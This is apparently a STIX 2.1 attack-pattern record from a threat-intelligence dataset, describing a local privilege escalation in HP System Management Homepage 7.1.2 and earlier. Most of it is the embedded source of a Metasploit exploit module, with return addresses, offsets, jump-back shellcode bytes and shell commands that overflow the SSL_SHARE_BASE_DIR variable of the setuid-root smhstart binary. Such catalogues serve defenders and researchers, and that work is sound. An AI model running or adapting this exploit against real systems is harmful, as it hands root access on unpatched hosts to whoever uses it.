{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c13fd250-510c-4be1-9083-e8bf693810e0",
    "created": "2024-08-14T16:58:50.531877Z",
    "modified": "2024-08-14T16:58:50.531888Z",
    "name": "HP System Management Homepage Local Privilege Escalation",
    "description": " Versions of HP System Management Homepage <= 7.1.2 include a setuid root smhstart which is vulnerable to a local buffer overflow in SSL_SHARE_BASE_DIR env variable.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/hp_smhstart.rb",
            "external_id": "hp_smhstart.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n\n  include Msf::Exploit::Local::Linux\n\n  def initialize(info={})\n    super( update_info( info, {\n        'Name'          => 'HP System Management Homepage Local Privilege Escalation',\n        'Description'   => %q{\n            Versions of HP System Management Homepage <= 7.1.2 include a setuid root\n          smhstart which is vulnerable to a local buffer overflow in SSL_SHARE_BASE_DIR\n          env variable.\n        },\n        'License'       => MSF_LICENSE,\n        'Author'        =>\n          [\n            'agix' # @agixid # Vulnerability discovery and Metasploit module\n          ],\n        'Platform'      => [ 'linux' ],\n        'Arch'          => [ ARCH_X86 ],\n        'SessionTypes'  => [ 'shell' ],\n        'Payload'\t\t=>\n          {\n            'Space'     => 227,\n            'BadChars' \t=> \"\\x00\\x22\"\n          },\n        'References'    =>\n          [\n            ['OSVDB', '91990']\n          ],\n        'Targets'       =>\n          [\n            [ 'HP System Management Homepage 7.1.1',\n              {\n                'Arch' => ARCH_X86,\n                'CallEsp' => 0x080c86eb, # call esp\n                'Offset' => 58\n              }\n            ],\n            [ 'HP System Management Homepage 7.1.2',\n              {\n                'Arch' => ARCH_X86,\n                'CallEsp' => 0x080c8b9b, # call esp\n                'Offset' => 58\n              }\n            ],\n          ],\n        'DefaultOptions' =>\n          {\n            'PrependSetuid'    => true\n          },\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2013-03-30',\n      }\n      ))\n    register_options([\n        OptString.new(\"smhstartDir\", [ true, \"smhstart directory\", \"/opt/hp/hpsmh/sbin/\" ])\n      ])\n  end\n\n  def exploit\n    pl = payload.encoded\n    padding = rand_text_alpha(target['Offset'])\n    ret = [target['CallEsp']].pack('V')\n    exploit =  pl\n    exploit << ret\n    exploit << \"\\x81\\xc4\\x11\\xff\\xff\\xff\" \t# add esp, 0xffffff11\n    exploit << \"\\xe9\\x0e\\xff\\xff\\xff\"\t\t# jmp => beginning of pl\n    exploit << padding\n    exploit_encoded = Rex::Text.encode_base64(exploit) # to not break the shell base64 is better\n    id=cmd_exec(\"id -un\")\n    if id!=\"hpsmh\"\n      fail_with(Failure::NoAccess, \"You are #{id}, you must be hpsmh to exploit this\")\n    end\n    cmd_exec(\"export SSL_SHARE_BASE_DIR=$(echo -n '#{exploit_encoded}' | base64 -d)\")\n    cmd_exec(\"#{datastore['smhstartDir']}/smhstart\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-03-30",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}